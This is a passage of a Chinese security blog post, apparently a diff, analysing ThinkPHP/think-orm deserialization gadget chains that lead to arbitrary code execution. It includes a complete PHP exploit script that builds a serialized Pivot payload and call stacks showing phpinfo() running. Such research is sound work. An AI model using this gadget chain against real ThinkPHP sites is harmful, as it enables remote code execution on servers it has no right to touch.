+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119000152841.png" alt="image-20220119000152841"></p>
+<p>再跟进 <code>serialize</code> 方法，这是在调用 <code>think\view\driver\Php</code> 类的 <code>display</code> 方法前各个变量的值👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119000542374.png" alt="image-20220119000542374"></p>
+<p>接着来到  <code>think\view\driver\Php</code> 类的 <code>display</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119000750059.png" alt="image-20220119000750059"></p>
+<p>最后看一下浏览器，可以发现 <code>phpinfo();</code> 被成功地执行了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119000948449.png" alt="image-20220119000948449"></p>
+<p>链条II分析就先到此结束了。</p>
+<h4 id="调用栈-2">- 调用栈 -</h4>
+<ul>
+<li><code>Php.php:103, think\view\driver\Php-&gt;display()</code></li>
+<li><code>Driver.php:243, think\cache\driver\File-&gt;serialize()</code></li>
+<li><code>File.php:171, think\cache\driver\File-&gt;set()</code></li>
+<li><code>Memcached.php:57, League\Flysystem\Cached\Storage\Memcached-&gt;save()</code></li>
+<li><code>AbstractCache.php:31, League\Flysystem\Cached\Storage\Memcached-&gt;__destruct()</code></li>
+</ul>
+<hr>
+<h2 id="入口二">- 入口二 -</h2>
+<p>还是从 <code>__destruct</code> 方法开始，不过这次选择的是 <code>vendor/topthink/think-orm/src/Model.php</code> 文件中的 <code>Model</code> 抽象类，显然 <code>$this-&gt;lazySave</code> 是可控的👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119131558762.png" alt="image-20220119131558762"></p>
+<p>那么往下全局搜索实现了 <code>Model</code> 这个抽象类的子类👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119131720816.png" alt="image-20220119131720816"></p>
+<p>此时仅有 <code>vendor/topthink/think-orm/src/model/Pivot.php</code> 文件中的 <code>Pivot</code> 类实现了 <code>Model</code>  抽象类，因此在写序列化 <strong>payload</strong> 时需要以 <code>Pivot</code> 类作为入口。</p>
+<p>先回到其 <code>save</code> 方法，这里要求至少要调用 <code>updateData</code> 或 <code>insertData</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119151234339.png" alt="image-20220119151234339"></p>
+<p>先跟进 <code>setAttrs</code> 方法，此时由于调用 <code>save</code> 方法时传入的是空参数，所以会用 <code>save</code> 方法的默认参数；而 <code>save</code> 方法的 <code>$data</code> 默认参数值为空数组，也就会将空数组传入 <code>setAttrs</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119151546077.png" alt="image-20220119151546077"></p>
+<p>可以看到 <code>setAttrs</code> 方法相当于什么也没做，接着再往下看 <code>isEmpty</code> 和 <code>trigger</code> 方法，并且需要使得 <code>if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite'))</code> 这个条件不成立。也就是说需要让 <code>isEmpty</code> 方法返回 <code>false</code> 型而 <code>trigger</code> 方法返回 <code>true</code> 型👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119152114024.png" alt="image-20220119152114024"></p>
+<p>再来看 <code>trigger</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119152208705.png" alt="image-20220119152208705"></p>
+<p>由此上边两个方法的条件就可以绕过去了，再看 <code>updateData</code> 和 <code>insertData</code> 方法，由于无论调用这两个方法中的哪一个都能到达目的，这里就着重对 <code>updateData</code> 方法进行分析👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119153520387.png" alt="image-20220119153520387"></p>
+<p>由于上面已经使 <code>tirgger</code> 方法返回值为 <code>true</code> 型，所以第一个条件可以忽略，直接先来看对 <code>checkData</code> 方法的调用👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119153725564.png" alt="image-20220119153725564"></p>
+<p>可以看到默认是啥也没有，也可以直接跳过，再来看对 <code>getChangedData</code> 方法的调用👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119154157886.png" alt="image-20220119154157886"></p>
+<p>而 <code>data</code> 在上面已经被构造成非空的任意值，所以有关 <code>if (empty($data)) </code> 条件是不会往下执行的，因此这个 <code>getChangedData</code> 方法只需要将里面的 <code>force</code> 以及 <code>readonly</code> 分别构造成 <code>true</code> 和 <code>空数组</code> 即可，不需要管 <code>data</code> 属性的值。</p>
+<p>然后对于 <code>if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime)</code> 这个条件，也只需要将 <code>autoWriteTimestamp</code> 或 <code>updateTime</code> 属性控制成 <code>false</code> 就行了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119154547153.png" alt="image-20220119154547153"></p>
+<p>接着，来到关键点，即是对 <code>checkAllowFields</code> 方法的调用👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119155010054.png" alt="image-20220119155010054"></p>
+<p>此时只要将 <code>table</code> 或 <code>suffix</code> 的值控制成一个类，也就可以进入到那一个类的 <code>__toString</code> 方法了。以上也就为对入口二的分析。</p>
+<h3 id="链条III-任意代码执行">- 链条III (任意代码执行) -</h3>
+<h4 id="终点-3">- 终点 -</h4>
+<p>最终形如 <code>[可控](可控,可控)</code> 的形式在 <code>vendor/topthink/think-orm/src/model/concern/Attribute.php</code> 文件 <code>Attribute</code> Trait的 <code>getJsonValue</code> 方法中👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119161959682.png" alt="image-20220119161959682"></p>
+<h4 id="分析-3">- 分析 -</h4>
+<p>由于上面的入口起点是 <code>__toString</code> 方法，这里直接来到 <code>vendor/topthink/think-orm/src/model/concern/Conversion.php</code> 文件中 <code>Conversion</code> Trait的 <code>__toString</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119162647273.png" alt="image-20220119162647273"></p>
+<p>跟进 <code>toJson</code> 方法，可以看到是一个有关json字符的处理，并且在处理过程中调用了 <code>toArray</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119162747539.png" alt="image-20220119162747539"></p>
+<p>跟进 <code>toArray</code> 方法，其中需要到达 <code>$item[$key] = $this-&gt;getAttr($key);</code> 这条语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119163452461.png" alt="image-20220119163452461"></p>
+<p>也就是说必须将 <code>visible</code> 控制成一个和 <code>data</code> 或 <code>relation</code> 属性同键名的数组，且该键名将作为可控值传入 <code>getAttr</code> 方法。</p>
+<p>继续跟进 <code>getAttr</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119163856372.png" alt="image-20220119163856372"></p>
+<p>由于 <code>$value</code> 变量的值来自 <code>getData</code> 方法，那么跟进 <code>getData</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119164614409.png" alt="image-20220119164614409"></p>
+<p>直接来看 <code>getRealFieldName</code> 方法的内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119164756016.png" alt="image-20220119164756016"></p>
+<p>只要让 <code>convertNameToCamel</code> 和 <code>strict</code> 属性的值分别为 <code>false</code> 和 <code>true</code> 即可让这个方法啥也不做直接返回传入的参数值了。也就是说现在只要将 <code>data</code> 属性的键名控制成和 <code>$name</code> 参数的一致即可返回任意值，意思是 <code>$value</code> 这个变量是完全可控的，此时再将跟进 <code>getValue</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119165815150.png" alt="image-20220119165815150"></p>
+<p>显然上面已经对 <code>getRealFieldName</code> 方法做了分析，这时就相当于返回传入的参数值，那么 <code>$fieldName</code> 变量便相当于传入的 <code>$name</code> 参数，然后在将 <code>withAttr</code> 数组属性控制成包含有 <code>$name</code> 参数值的键名且对应键值要为数组，以及 <code>json</code> 数组属性的键值包含有 <code>$name</code> 参数的值后就可以到达关键的调用了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119170529544.png" alt="image-20220119170529544"></p>
+<p>整条任意代码执行的链条就结束了，以下是该链条的简单类示意👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span>, <span class="title">ArrayAccess</span>, <span class="title">Arrayable</span>, <span class="title">Jsonable</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getJsonValue</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Php</span> <span class="keyword">implements</span> <span class="title">TemplateHandlerInterface</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$content</span>, <span class="keyword">array</span> <span class="variable">$data</span> = []</span>)</span>&#123;&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<h4 id="exp-动调-3">- exp&amp;动调 -</h4>
+<p>这个 <code>exp</code> 会比较长👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">contract</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">Arrayable</span>&#123;&#125;</span><br><span class="line">	<span class="title">interface</span> <span class="title">Jsonable</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">	<span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line">		<span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$json</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$visible</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$convertNameToCamel</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">contract</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">TemplateHandlerInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">view</span>\<span class="title">driver</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">TemplateHandlerInterface</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Php</span> <span class="keyword">implements</span> <span class="title">TemplateHandlerInterface</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="title">use</span> <span class="title">JsonSerializable</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">ArrayAccess</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">Arrayable</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">Jsonable</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">view</span>\<span class="title">driver</span>\<span class="title">Php</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span>, <span class="title">ArrayAccess</span>, <span class="title">Arrayable</span>, <span class="title">Jsonable</span></span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">		<span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">		<span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>): <span class="title">mixed</span></span>&#123;&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>): <span class="title">bool</span></span>&#123;&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>): <span class="title">mixed</span></span>&#123;&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>,<span class="variable">$value</span></span>): <span class="title">void</span></span>&#123;&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>): <span class="title">void</span></span>&#123;&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;a&#x27;</span>=&gt;[<span class="string">&#x27;1&#x27;</span>=&gt;<span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27; ?&gt;&#x27;</span>]];</span><br><span class="line">			<span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;a&#x27;</span>=&gt;[<span class="string">&#x27;1&#x27;</span>=&gt;[<span class="keyword">new</span> Php,<span class="string">&quot;display&quot;</span>]]];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">			<span class="built_in">parent</span>::__construct(<span class="variable">$code</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;visible=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="literal">null</span>];</span><br><span class="line">			<span class="keyword">$this</span>-&gt;json = [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">			<span class="keyword">$this</span>-&gt;table = <span class="keyword">$this</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="keyword">new</span> Pivot(<span class="string">&#x27;phpinfo();&#x27;</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么继续对 <strong>exp</strong> 进行动调，这次从入口处开始👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119193448255.png" alt="image-20220119193448255"></p>
+<p>跟进 <code>think\Model</code> 抽象类 <code>save</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119193955487.png" alt="image-20220119193955487"></p>
+<p>跟进 <code>setAttrs</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119194126959.png" alt="image-20220119194126959"></p>
+<p>接着是 <code>isEmpty</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119194257312.png" alt="image-20220119194257312"></p>
+<p>还有 <code>trigger</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119194437008.png" alt="image-20220119194437008"></p>
+<p>由于 <code>isEmpty</code> 方法返回 <code>false</code> ，<code>trigger</code> 方法返回 <code>true</code> ，那么就可以直接跳到下一条语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119194626755.png" alt="image-20220119194626755"></p>
+<p>继续跟进 <code>updateData</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119195013398.png" alt="image-20220119195013398"></p>
+<p>那么依次进行分析，由于 <code>checkData</code> 方法默认是空着的，先跟进 <code>getChangedData</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119195414740.png" alt="image-20220119195414740"></p>
+<p>接着看 <code>if (empty($data))  </code> 这一步👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119195513574.png" alt="image-20220119195513574"></p>
+<p>然后到 <code>if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime)</code> 这条语句 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119195711044.png" alt="image-20220119195711044"></p>
+<p>此时就到调用 <code>checkAllowFields</code> 关键方法的部分了，跟进 <code>checkAllowFields</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119200128613.png" alt="image-20220119200128613"></p>
+<p>下一步即是跟进 <code>__toString</code> 方法了，来看 <code>think\model\concern\Conversion</code> Trait的 <code>__toString</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119200441302.png" alt="image-20220119200441302"></p>
+<p>再跟进 <code>toJson</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119200608474.png" alt="image-20220119200608474"></p>
+<p>继续跟进 <code>toArray</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119201119284.png" alt="image-20220119201119284"></p>
+<p>先看 <code>foreach ($this-&gt;visible as $key =&gt; $val)</code> 语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119201309957.png" alt="image-20220119201309957"></p>
+<p>接着看 <code>foreach ($this-&gt;hidden as $key =&gt; $val)</code> 语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119201419058.png" alt="image-20220119201419058"></p>
+<p>此时来到 <code>$data = array_merge($this-&gt;data, $this-&gt;relation)</code> 语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119201704982.png" alt="image-20220119201704982"></p>
+<p>最后到关键语句的执行👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119202341237.png" alt="image-20220119202341237"></p>
+<p>那么继续跟进 <code>getAttr</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119202745390.png" alt="image-20220119202745390"></p>
+<p>先看 <code>getData</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119203058502.png" alt="image-20220119203058502"></p>
+<p>跟进 <code>getRealFieldName</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119203324080.png" alt="image-20220119203324080"></p>
+<p>接着往下看👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119204131327.png" alt="image-20220119204131327"></p>
+<p>在调用 <code>getValue</code> 方法前各个参数的值👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119204240782.png" alt="image-20220119204240782"></p>
+<p>跟进 <code>getValue</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119204743230.png" alt="image-20220119204743230"></p>
+<p>此时一步步跟进，显然 <code>get</code> 属性并不存在 <code>$fieldName</code> 的键名👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119204931425.png" alt="image-20220119204931425"></p>
+<p>接着是 <code>if (isset($this-&gt;withAttr[$fieldName]))</code> 语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119205436791.png" alt="image-20220119205436791"></p>
+<p>然后是 <code>if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName]))</code> 语句👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119205833804.png" alt="image-20220119205833804"></p>
+<p>在调用 <code>getJsonValue</code> 方法前可以先看一下 <code>$fieldName</code> 和 <code>$value</code> 的值👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119205948679.png" alt="image-20220119205948679"></p>
+<p>跟进 <code>getJsonValue</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119210458198.png" alt="image-20220119210458198"></p>
+<p>最后跟进 <code>Php</code> 类的 <code>display</code> 方法，这是最终到达的值👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119210656256.png" alt="image-20220119210656256"></p>
+<p>此时看一下浏览器，可以发现 <code>phpinfo();</code> 被成功执行👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120142914229.png" alt="image-20220120142914229"></p>
+<p>以上为对链条III的分析。</p>
+<h4 id="调用栈-3">- 调用栈 -</h4>
+<ul>
+<li><code>Php.php:103, think\view\driver\Php-&gt;display()</code></li>
+<li><code>Attribute.php:535, think\model\Pivot-&gt;getJsonValue()</code></li>
+<li><code>Attribute.php:494, think\model\Pivot-&gt;getValue()</code></li>
+<li><code>Attribute.php:465, think\model\Pivot-&gt;getAttr()</code></li>
+<li><code>Conversion.php:234, think\model\Pivot-&gt;toArray()</code></li>
+<li><code>Conversion.php:320, think\model\Pivot-&gt;toJson()</code></li>
+<li><code>Conversion.php:325, think\model\Pivot-&gt;__toString()</code></li>
+<li><code>Model.php:564, think\model\Pivot-&gt;checkAllowFields()</code></li>
+<li><code>Model.php:614, think\model\Pivot-&gt;updateData()</code></li>
+<li><code>Model.php:535, think\model\Pivot-&gt;save()</code></li>
+<li><code>Model.php:1059, think\model\Pivot-&gt;__destruct()</code></li>
+</ul>
+<hr>
+<h3 id="链条IV-任意代码执行">- 链条IV (任意代码执行) -</h3>
+<h4 id="终点-4">- 终点 -</h4>
